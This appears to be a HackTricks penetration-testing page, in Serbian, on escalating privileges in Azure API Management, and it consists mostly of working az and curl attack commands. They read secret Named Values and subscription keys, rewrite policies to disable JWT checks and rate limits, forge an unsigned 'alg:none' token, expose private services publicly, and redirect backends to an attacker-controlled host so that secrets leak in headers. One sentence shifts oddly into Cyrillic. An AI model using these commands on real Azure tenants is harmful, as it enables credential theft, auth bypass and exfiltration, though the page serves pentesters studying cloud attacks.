# Az - API Management Privesc

{{#include ../../../banners/hacktricks-training.md}}

## `Microsoft.ApiManagement/service/namedValues/read` & `Microsoft.ApiManagement/service/namedValues/listValue/action`

Napad se sastoji u pristupu osetljivim secrets koji su pohranjeni u Azure API Management Named Values — bilo direktnim preuzimanjem vrednosti secrets ili zloupotrebom dozvola kako bi se pribavili Key Vault–backed secrets putem managed identities.
```bash
az apim nv show-secret --resource-group <resource-group> --service-name <service-name> --named-value-id <named-value-id>
```
## `Microsoft.ApiManagement/service/subscriptions/read` & `Microsoft.ApiManagement/service/subscriptions/listSecrets/action`
Za svaku subscription napadač može dobiti subscription keys koristeći listSecrets endpoint pomoću POST metode:
```bash
az rest --method POST \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/subscriptions/<subscription-sid>/listSecrets?api-version=2024-05-01"
```
Odgovor sadrži subscription primary key (primaryKey) i secondary key (secondaryKey). Pomoću ovih ključeva attacker može da se autentifikuje i pristupi API-jevima objavljenim kroz API Management Gateway:
```bash
curl -H "Ocp-Apim-Subscription-Key: <primary-key-or-secondary-key>" \
https://<service-name>.azure-api.net/<api-path>
```
Napadač može pristupiti svim API-jevima i proizvodima povezanim sa pretplatom. Ako pretplata ima pristup osetljivim proizvodima ili API-jevima, napadač može pribaviti poverljive informacije ili izvršiti neovlašćene operacije.

## `Microsoft.ApiManagement/service/policies/write` or `Microsoft.ApiManagement/service/apis/policies/write`

Napadač prvo preuzima trenutnu API politiku:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/apis/<api-id>/policies/?api-version=2024-05-01&format=rawxml"
```
Napadač može izmeniti politiku na više načina u zavisnosti od svojih ciljeva. Na primer, da bi onemogućio autentifikaciju, ako politika uključuje JWT token validation, napadač može ukloniti ili zakomentarisati taj deo:
```xml
<policies>
<inbound>
<base />
<!-- JWT validation removed by the attacker -->
<!-- <validate-jwt header-name="Authorization" failed-validation-httpcode="401" >
...
</validate-jwt> -->
</inbound>
<backend>
<base />
</backend>
<outbound>
<base />
</outbound>
<on-error>
<base />
</on-error>
</policies>
```
Da ukloni rate limiting controls i omogući denial-of-service napade, napadač može ukloniti ili zakomentarisati quota i rate-limit policies:
```xml
<policies>
<inbound>
<base />
<!-- Rate limiting removed by the attacker -->
<!-- <rate-limit calls="100" renewal-period="60" />
<quota-by-key calls="1000" renewal-period="3600" counter-key="@(context.Subscription.Id)" /> -->
</inbound>
...
</policies>
```
Da biste izmenili backend rutu i preusmerili saobraćaj na attacker-controlled server:
```xml
<policies>
...
<inbound>
<base />
<set-backend-service base-url="https://attacker-controlled-server.com" />
</inbound>
...
</policies>
```
Napadač zatim primenjuje izmenjenu politiku. Telo zahteva mora biti JSON objekat koji sadrži politiku u XML formatu:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/apis/<api-id>/policies/policy?api-version=2024-05-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"format": "rawxml",
"value": "<policies><inbound><base /></inbound><backend><base /></backend><outbound><base /></outbound><on-error><base /></on-error></policies>"
}
}'
```
## JWT: pogrešna konfiguracija validacije

Napadač mora znati da API koristi validaciju JWT tokena i da je politika pogrešno konfigurisana. Loše konfigurisana politika validacije JWT može imati `require-signed-tokens="false"` ili `require-expiration-time="false"`, što omogućava servisu da prihvati nepotpisane tokene ili tokene koji nikada ne ističu.

Napadač kreira zlonamerni JWT token koristeći none algoritam (nepotpisan):
```
# Header: {"alg":"none"}
# Payload: {"sub":"user"}
eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyIn0.
```
Napadač šalje zahtev ka API-ju koristeći zlonamerni token:
```bash
curl -X GET \
-H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyIn0." \
https://<apim>.azure-api.net/path
```
Ako je politika pogrešno konfigurisana sa `require-signed-tokens="false"`, servis će prihvatiti nepotpisani token. Napadač takođe može kreirati token bez izjave o isteku ako je `require-expiration-time="false"`.

## `Microsoft.ApiManagement/service/applynetworkconfigurationupdates/action`
Napadač prvo proverava trenutnu mrežnu konfiguraciju servisa:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<apim>?api-version=2024-05-01"
```
Napadač pregledava JSON odgovor da bi proverio vrednosti `publicNetworkAccess` i `virtualNetworkType`. Ako je `publicNetworkAccess` postavljen na false ili je `virtualNetworkType` postavljen na Internal, servis je konfigurisan za privatni pristup.

Da bi izložio servis Internetu, napadač mora promeniti oba podešavanja. Ako servis radi u internom režimu (`virtualNetworkType: "Internal"`), napadač ga menja na None ili External i omogućava pristup javnoj mreži. Ovo se može uraditi korišćenjem Azure Management API:
```bash
az rest --method PATCH \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<apim>?api-version=2024-05-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"publicNetworkAccess": "Enabled",
"virtualNetworkType": "None"
}
}'
```
Kada je `virtualNetworkType` postavljen na `None` ili `External` i `publicNetworkAccess` je omogućen, servis i svi njegovi API-ji postaju dostupni sa Interneta, čak i ako su prethodno bili zaštićeni iza privatne mreže ili privatnih krajnjih tačaka.

## `Microsoft.ApiManagement/service/backends/write`
Napadač prvo enumeriše postojeće backende kako bi identifikovao koji treba izmeniti:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends?api-version=2024-05-01"
```
Napadač preuzima trenutnu konfiguraciju backend-a koju želi da izmeni:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01"
```
Napadač menja backend URL tako da pokazuje na server pod njegovom kontrolom. Prvo dobiju ETag iz prethodnog odgovora, a zatim ažuriraju backend:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01" \
--headers "Content-Type=application/json" "If-Match=*" \
--body '{
"properties": {
"url": "https://attacker-controlled-server.com",
"protocol": "http",
"description": "Backend modified by attacker"
}
}'
```
Alternativno, napadač može да конфигурише backend headers да exfiltrate Named Values који садрже тајне. Ово се ради кроз backend credentials configuration:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01" \
--headers "Content-Type=application/json" "If-Match=*" \
--body '{
"properties": {
"url": "https://attacker-controlled-server.com",
"protocol": "http",
"credentials": {
"header": {
"X-Secret-Value": ["{{named-value-secret}}"]
}
}
}
}'
```
Sa ovom konfiguracijom, Named Values se šalju kao headers u svim zahtevima ka backendu koji kontroliše napadač, omogućavajući eksfiltraciju osetljivih tajni.

{{#include ../../../banners/hacktricks-training.md}}
